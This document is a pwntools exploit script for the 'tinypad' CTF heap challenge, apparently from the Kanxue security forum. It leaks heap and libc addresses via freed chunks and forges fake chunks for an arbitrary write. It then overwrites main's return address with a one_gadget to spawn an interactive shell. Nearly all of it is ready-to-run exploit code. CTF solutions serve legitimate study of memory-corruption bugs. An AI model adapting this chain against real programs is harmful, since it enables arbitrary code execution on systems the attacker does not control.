
```
#!/usr/bin/env python

# coding=utf-8

from pwn import *

elf = ELF('./tinypad')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./tinypad')

context.log_level = 'debug'



def cmd(choice):

  p.sendlineafter("(CMD)>>> ", choice)



def create(size, content):

  cmd("A")

  p.sendlineafter("(SIZE)>>> ", str(size))

  p.sendlineafter("(CONTENT)>>> ", content)



def delete(index):

  cmd("D")

  p.sendlineafter("(INDEX)>>> ", str(index))



def edit(index, content):

  cmd("E")

  p.sendlineafter("(INDEX)>>> ", str(index))

  p.sendlineafter("(CONTENT)>>> ", content)

  p.sendlineafter("(Y/n)>>> ", "Y")



def quit():

  cmd("Q")



create(0x80, 'a'*0x80)

create(0x80, 'b'*0x80)

create(0x80, 'c'*0x80)

create(0x80, 'd'*0x80)



delete(3)

delete(1)

p.recvuntil("INDEX: 1\n")

p.recvuntil(" # CONTENT: ")

heap_addr = u64(p.recvline().rstrip().ljust(8, '\x00')) - 0x120

p.recvuntil("INDEX: 3\n")

p.recvuntil(" # CONTENT: ")

main_arena_addr = u64(p.recvline().strip().ljust(8, '\x00')) - 88

libc_base = main_arena_addr - 0x3c4b20

print "======== some addrs ======="

print hex(main_arena_addr)

print hex(libc_base)

print hex(heap_addr)

delete(2)

delete(4)

#gdb.attach(p,'b *0x400E4E')

create(0x10, '1'*0x10)

create(0x100, '2'*0xf8+p64(0x11))

create(0x100, '3'*0xf8)

create(0x100, '4'*0xf8)



tinypad = 0x0602040

offset = heap_addr - tinypad

print "============ offset ==========="

print offset

fake_chunk = p64(0) + p64(0x101) + p64(0x602060)*2

edit(3, "a"*0x20 + fake_chunk)

delete(1)

create(0x18, '1'*0x10 + p64(offset))

delete(2)

edit(4, "4"*0x20 + p64(0) + p64(0x101) + p64(main_arena_addr + 88)*2)



one_gadget = libc_base + 0x45226

environ_pointer = libc_base + libc.symbols['__environ']

create(0xf0, '6'*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148))



p.recvuntil(" #   INDEX: 1\n")

p.recvuntil(" # CONTENT: ")

leak_addr = u64(p.recvline().rstrip().ljust(8, '\x00'))

main_ret = leak_addr - 0x8 * 30

p.success("main_ret: %x" % main_ret)

p.success("leak_addr: %x" % leak_addr)

edit(2, p64(main_ret))

#gdb.attach(p)

#pause()

edit(1, p64(one_gadget))

quit()

p.interactive()
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
